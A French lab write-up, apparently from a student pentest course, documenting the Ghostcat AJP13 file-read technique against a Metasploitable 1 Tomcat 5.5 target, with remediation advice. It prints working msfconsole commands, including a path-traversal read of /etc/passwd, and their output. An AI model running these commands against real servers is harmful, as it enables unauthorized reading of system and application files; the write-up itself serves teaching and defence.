@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AJP13 — Lecture de fichiers — TP-PENTEST-MS123</title>
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="classification-band">LABO PÉDAGOGIQUE — USAGE INTERNE</div>
+
+  <header class="doc-header">
+    <div class="agency">TP-PENTEST-MS123-2026 &middot; <a href="../index.html" style="color:inherit;">&larr; retour au sommaire</a></div>
+    <h1 class="doc-title">AJP13 — Lecture de fichiers arbitraires via le connecteur Tomcat</h1>
+    <h2 class="doc-subtitle">Technique "Ghostcat" fonctionnelle malgré une cible officiellement hors de la plage de versions vulnérables</h2>
+    <table class="meta">
+      <tr><td class="label">Service / Port</td><td>AJP13 (connecteur Tomcat) — port <code class="mono">8009</code></td></tr>
+      <tr><td class="label">Cible</td><td>Metasploitable 1 — <code class="mono">192.168.56.102</code></td></tr>
+      <tr><td class="label">CVE</td><td><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1938">CVE-2020-1938</a> (Ghostcat) — plage officielle non couverte ici, voir §2</td></tr>
+      <tr><td class="label">Résultat</td><td><strong>Lecture arbitraire de fichiers</strong> (dont <code class="mono">/etc/passwd</code>)</td></tr>
+      <tr><td class="label">Testé par</td><td>ZANNOU Josaphat</td></tr>
+    </table>
+  </header>
+
+  <blockquote class="evidence">
+    <strong>Note réseau.</strong> Cette page utilise le réseau de Josaphat
+    (<code>vboxnet0</code>) : cible <code>192.168.56.102</code>. Côté Jules, le même service
+    est sur <code>172.28.128.4</code>. Même Tomcat 5.5 que <a href="tomcat.html">tomcat.html</a>
+    (port 8180), mais surface d'attaque différente (le connecteur AJP, pas l'interface HTTP).
+  </blockquote>
+
+  <h2 class="section">1. Identification</h2>
+  <pre class="terminal">$ nmap -sC -sV -p 8009 192.168.56.102
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request</pre>
+
+  <p>Le connecteur <strong>AJP13</strong> de Tomcat 5.5 est exposé directement — il n'est <strong>pas
+  censé être exposé publiquement</strong> : il sert normalement à la communication interne entre
+  un serveur web frontal et Tomcat.</p>
+
+  <figure class="capture" id="cap-recon">
+    <img src="../images/ms1-ajp13/01-recon-nmap.png" alt="Scan nmap du port 8009">
+    <figcaption>
+      <strong class="idx">1.</strong>
+      <span class="desc"><code>8009/tcp open ajp13 Apache Jserv (Protocol v1.3)</code>.</span>
+      <span class="fname">images/ms1-ajp13/01-recon-nmap.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">2. Méthode d'identification de la CVE et du module</h2>
+  <p>Le parcours suggère de vérifier si une variante de Ghostcat s'applique, en notant qu'elle
+  vise normalement des versions plus récentes. Vérification via la vraie source (pas de
+  mémoire) :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "info auxiliary/admin/http/tomcat_ghostcat; exit"
+Description:
+  In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to
+  7.0.99, Tomcat shipped with an AJP Connector enabled by default...
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2020-1938</pre>
+
+  <p>Plage officielle confirmée : <strong>Tomcat 7.0.0 à 9.0.30</strong>. La cible est en
+  <strong>Tomcat 5.5</strong>, antérieure à toute cette plage. D'après la CVE officielle, ça ne
+  devrait pas s'appliquer.</p>
+
+  <figure class="capture" id="cap-range">
+    <img src="../images/ms1-ajp13/02-verif-cve-range.png" alt="Plage de versions officielle Ghostcat">
+    <figcaption>
+      <strong class="idx">2.</strong>
+      <span class="desc">Plage officielle de CVE-2020-1938 : Tomcat 7.0 à 9.0.30 — la cible en
+      5.5 est en dehors, contraste volontaire.</span>
+      <span class="fname">images/ms1-ajp13/02-verif-cve-range.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">3. Démarche d'exploitation</h2>
+  <p>Conformément à la méthodologie (vérifier plutôt que supposer), test effectif du module
+  malgré la version :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 192.168.56.102; set RPORT 8009; run; exit"
+&lt;web-app xmlns="http://java.sun.com/xml/ns/j2ee" ...&gt;
+  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
+  ...
+[+] 192.168.56.102:8009 - File contents save to: /home/josa/.msf4/loot/...web.xml....txt</pre>
+
+  <blockquote class="evidence">
+    <strong>⚠️ Résultat surprenant.</strong> Le module a bien récupéré
+    <code>/WEB-INF/web.xml</code> — un fichier protégé, normalement inaccessible depuis un
+    navigateur HTTP classique — alors que la cible est largement antérieure à la plage
+    officiellement couverte par CVE-2020-1938. La documentation du CVE dit explicitement
+    "7.0+", et pourtant ça marche sur 5.5. Le mécanisme sous-jacent (le connecteur AJP traite
+    les requêtes comme hautement fiables et résout le chemin demandé sans le restreindre
+    correctement) est probablement présent bien avant Tomcat 7.0 — la plage "officielle"
+    reflète ce qu'Apache a <strong>testé et corrigé au moment de la divulgation en 2020</strong>,
+    pas forcément la totalité des versions réellement affectées.
+  </blockquote>
+
+  <figure class="capture" id="cap-webxml">
+    <img src="../images/ms1-ajp13/03-ghostcat-webxml.png" alt="Lecture de WEB-INF/web.xml via AJP">
+    <figcaption>
+      <strong class="idx">3.</strong>
+      <span class="desc">Contenu XML de <code>WEB-INF/web.xml</code> récupéré malgré la
+      version — fichier sauvegardé dans le loot Metasploit.</span>
+      <span class="fname">images/ms1-ajp13/03-ghostcat-webxml.png</span>
+    </figcaption>
+  </figure>
+
+  <p>Pour confirmer que ce n'est pas un hasard, test avec une traversée de chemin vers un
+  fichier hors de l'application web :</p>
+
+  <pre class="terminal">$ msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS 192.168.56.102; set RPORT 8009; set FILENAME /../../../../../../etc/passwd; run; exit"
+root:x:0:0:root:/root:/bin/bash
+...
+msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
+...
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash</pre>
+
+  <p><strong><code>/etc/passwd</code> entier récupéré</strong>, confirmant une vraie lecture
+  arbitraire de fichiers système, pas limitée au webapp.</p>
+
+  <figure class="capture" id="cap-passwd">
+    <img src="../images/ms1-ajp13/04-ghostcat-etc-passwd.png" alt="Lecture de /etc/passwd via traversée de chemin AJP">
+    <figcaption>
+      <strong class="idx">4.</strong>
+      <span class="desc">Comptes <code>msfadmin</code>, <code>user</code>, <code>service</code>
+      lus dans <code>/etc/passwd</code> via traversée de chemin — résultat le plus fort de
+      cette étape.</span>
+      <span class="fname">images/ms1-ajp13/04-ghostcat-etc-passwd.png</span>
+    </figcaption>
+  </figure>
+
+  <h2 class="section">4. Preuve d'accès obtenu</h2>
+  <p>Lecture de <code>/WEB-INF/web.xml</code> (fichier protégé) et de <code>/etc/passwd</code>
+  (hors webapp, traversal) toutes deux réussies. Pas de shell direct, mais une primitive de
+  <strong>lecture arbitraire de fichiers</strong> confirmée, similaire en impact à ce qu'on a vu
+  sur MySQL (<a href="mysql.html">mysql.html</a>) — exfiltration de fichiers sensibles,
+  recoupement des comptes système déjà connus.</p>
+
+  <h2 class="section">5. Remédiation</h2>
+  <div class="verdict-box">
+    <span class="verdict-label">RECOMMANDATIONS</span>
+    <ul style="margin-top:6px;">
+      <li><strong>Ne jamais exposer le connecteur AJP sur une interface publique</strong> —
+      cause racine, rappelée explicitement par la documentation Tomcat elle-même. Le limiter à
+      <code>localhost</code> ou le désactiver si inutilisé.</li>
+      <li>Mettre à jour Tomcat : la 5.5 est obsolète depuis longtemps et partage des faiblesses
+      structurelles avec les versions officiellement vulnérables.</li>
+      <li>Si le connecteur AJP est nécessaire (reverse proxy en frontal), le protéger par un
+      secret partagé (<code>requiredSecret</code>) et le restreindre par pare-feu.</li>
+      <li>Ne pas se fier uniquement au numéro de version pour écarter une faille : tester
+      activement quand c'est faisable, comme fait ici.</li>
+    </ul>
+  </div>
+
+  <h2 class="section">6. Sources</h2>
+  <ul>
+    <li>Write-up technique détaillé : <a href="../../ms1/josa/ajp13.md"><code>ms1/josa/ajp13.md</code></a> (dépôt du labo)</li>
+    <li>CVE-2020-1938 : <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1938">nvd.nist.gov/vuln/detail/CVE-2020-1938</a></li>
+  </ul>
+
+  <div class="status-footer">FIN DE SECTION — AJP13 LECTURE ARBITRAIRE DE FICHIERS</div>
+  <div class="signoff">KAGBAHINTO Jules &amp; ZANNOU Josaphat</div>
+
+</div>
+</body>
+</html>
